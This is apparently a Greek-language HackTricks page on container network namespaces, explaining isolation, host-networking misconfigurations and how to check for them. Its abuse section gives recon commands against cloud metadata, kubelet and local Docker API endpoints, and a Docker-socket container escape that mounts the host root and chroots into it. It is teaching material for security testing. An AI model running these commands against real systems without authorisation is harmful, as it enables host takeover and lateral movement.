# Χώρος ονομάτων δικτύου

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ο χώρος ονομάτων δικτύου απομονώνει πόρους σχετικούς με το δίκτυο όπως διεπαφές, διευθύνσεις IP, πίνακες δρομολόγησης, κατάσταση ARP/neighbor, κανόνες firewall, sockets και τα περιεχόμενα αρχείων όπως `/proc/net`. Γι' αυτό ένα container μπορεί να έχει κάτι που μοιάζει με δικό του `eth0`, τους δικούς του τοπικούς routes και τη δική του συσκευή loopback χωρίς να κατέχει το πραγματικό network stack του host.

Από άποψη ασφάλειας, αυτό έχει σημασία γιατί η απομόνωση δικτύου αφορά πολύ περισσότερα από το port binding. Ένας ιδιωτικός χώρος ονομάτων δικτύου περιορίζει τι μπορεί το workload να παρατηρήσει ή να επαναδιαμορφώσει άμεσα. Μόλις αυτός ο χώρος ονομάτων κοινοποιηθεί με τον host, το container μπορεί ξαφνικά να αποκτήσει ορατότητα σε host listeners, host-local services και network control points που δεν προορίζονταν ποτέ να εκτεθούν στην εφαρμογή.

## Λειτουργία

Ένας πρόσφατα δημιουργημένος χώρος ονομάτων δικτύου ξεκινά με ένα άδειο ή σχεδόν άδειο δικτυακό περιβάλλον μέχρι να προσαρτηθούν διεπαφές σε αυτόν. Τα container runtimes στη συνέχεια δημιουργούν ή συνδέουν virtual interfaces, αναθέτουν διευθύνσεις και ρυθμίζουν routes ώστε το workload να έχει την αναμενόμενη συνδεσιμότητα. Σε deployments βάσει bridge, αυτό συνήθως σημαίνει ότι το container βλέπει μια διεπαφή με veth που είναι συνδεδεμένη σε host bridge. Στο Kubernetes, τα CNI plugins χειρίζονται το αντίστοιχο setup για το Pod networking.

Αυτή η αρχιτεκτονική εξηγεί γιατί το `--network=host` ή `hostNetwork: true` είναι μια τόσο δραματική αλλαγή. Αντί να λαμβάνει ένα προετοιμασμένο ιδιωτικό network stack, το workload ενώνεται με το πραγματικό του host.

## Εργαστήριο

Μπορείτε να δείτε έναν σχεδόν άδειο χώρο ονομάτων δικτύου με:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Και μπορείτε να συγκρίνετε κανονικά και host-networked containers με:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Το container που χρησιμοποιεί host networking δεν έχει πια τη δική του απομονωμένη άποψη των sockets και των διεπαφών. Αυτή η αλλαγή από μόνη της είναι σημαντική, ακόμα και πριν ρωτήσετε ποιες capabilities έχει η διεργασία.

## Runtime Usage

Docker και Podman συνήθως δημιουργούν ένα ιδιωτικό network namespace για κάθε container, εκτός αν έχουν διαμορφωθεί διαφορετικά. Kubernetes συνήθως δίνει σε κάθε Pod το δικό του network namespace, το οποίο μοιράζεται από τα containers μέσα στο Pod αλλά είναι ξεχωριστό από το host. Incus/LXC systems επίσης παρέχουν ισχυρή απομόνωση βασισμένη σε network namespaces, συχνά με μεγαλύτερη ποικιλία ρυθμίσεων virtual networking.

Η κοινή αρχή είναι ότι το private networking είναι το προεπιλεγμένο όριο απομόνωσης, ενώ το host networking είναι μια ρητή επιλογή αποχώρησης από αυτό το όριο.

## Misconfigurations

Η πιο σημαντική κακή ρύθμιση είναι απλώς το μοίρασμα του host network namespace. Αυτό γίνεται μερικές φορές για λόγους απόδοσης, low-level monitoring ή ευκολίας, αλλά καταργεί ένα από τα πιο καθαρά όρια που είναι διαθέσιμα στα containers. Host-local listeners γίνονται προσβάσιμοι με πιο άμεσο τρόπο, localhost-only services μπορεί να γίνουν προσβάσιμες, και capabilities όπως `CAP_NET_ADMIN` ή `CAP_NET_RAW` γίνονται πολύ πιο επικίνδυνες επειδή οι ενέργειες που επιτρέπουν εφαρμόζονται πλέον στο ίδιο το network περιβάλλον του host.

Ένα άλλο πρόβλημα είναι η υπερβολική χορήγηση δικαιωμάτων σχετικών με το δίκτυο ακόμη και όταν το network namespace είναι ιδιωτικό. Ένα ιδιωτικό namespace βοηθά, αλλά δεν καθιστά τους raw sockets ή τον προηγμένο έλεγχο δικτύου αβλαβείς.

## Abuse

Σε αδύναμα απομονωμένα setups, attackers μπορεί να εξετάσουν υπηρεσίες που ακούνε στο host, να προσεγγίσουν management endpoints που είναι δεσμευμένα μόνο στο loopback, να sniff-άρουν ή να παρεμβαίνουν στην κίνηση ανάλογα με τις ακριβείς capabilities και το περιβάλλον, ή να αναδιαμορφώσουν το routing και την κατάσταση του firewall αν υπάρχει `CAP_NET_ADMIN`. Σε ένα cluster, αυτό μπορεί επίσης να διευκολύνει lateral movement και control-plane reconnaissance.

If you suspect host networking, start by confirming that the visible interfaces and listeners belong to the host rather than to an isolated container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Οι υπηρεσίες που είναι προσβάσιμες μόνο μέσω loopback είναι συχνά η πρώτη ενδιαφέρουσα ανακάλυψη:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Αν υπάρχουν network capabilities, ελέγξτε αν το workload μπορεί να επιθεωρήσει ή να τροποποιήσει το ορατό stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Σε περιβάλλοντα cluster ή cloud, η δικτύωση του host επίσης δικαιολογεί γρήγορη τοπική αναγνώριση (recon) των μεταδεδομένων και των υπηρεσιών που είναι κοντά στο control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Πλήρες Παράδειγμα: Host Networking + Local Runtime / Kubelet Access

Το host networking δεν παρέχει αυτόματα host root, αλλά συχνά εκθέτει υπηρεσίες που σκόπιμα είναι προσβάσιμες μόνο από τον ίδιο τον κόμβο. Εάν μία από αυτές τις υπηρεσίες είναι ασθενώς προστατευμένη, το host networking γίνεται άμεσο μονοπάτι privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet στο localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Επιπτώσεις:

- άμεσος συμβιβασμός του host αν ένα τοπικό runtime API εκτεθεί χωρίς κατάλληλη προστασία
- αναγνώριση του cluster ή πλευρική μετακίνηση αν το kubelet ή τοπικοί agents είναι προσβάσιμοι
- παραποίηση της κυκλοφορίας ή denial of service όταν συνδυάζεται με `CAP_NET_ADMIN`

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να διαπιστωθεί εάν η διεργασία διαθέτει ιδιωτική στοίβα δικτύου, ποιες δρομολογήσεις και listeners είναι ορατές, και αν η όψη του δικτύου μοιάζει ήδη με αυτή του host πριν καν δοκιμάσετε τις capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Τι είναι ενδιαφέρον εδώ:

- Αν ο αναγνωριστής του namespace ή το σύνολο των εμφανών διεπαφών μοιάζει με το host, ενδέχεται να χρησιμοποιείται ήδη host networking.
- Το `ss -lntup` είναι ιδιαίτερα πολύτιμο επειδή αποκαλύπτει loopback-only listeners και τοπικά σημεία διαχείρισης.
- Οι routes, τα ονόματα διεπαφών και το πλαίσιο του firewall γίνονται πολύ πιο σημαντικά αν υπάρχει το `CAP_NET_ADMIN` ή το `CAP_NET_RAW`.

Όταν εξετάζετε ένα container, αξιολογήστε πάντα το network namespace μαζί με το capability set. Host networking σε συνδυασμό με ισχυρές δικτυακές δυνατότητες είναι μια πολύ διαφορετική στάση σε σχέση με bridge networking μαζί με ένα στενό προεπιλεγμένο capability set.
{{#include ../../../../../banners/hacktricks-training.md}}
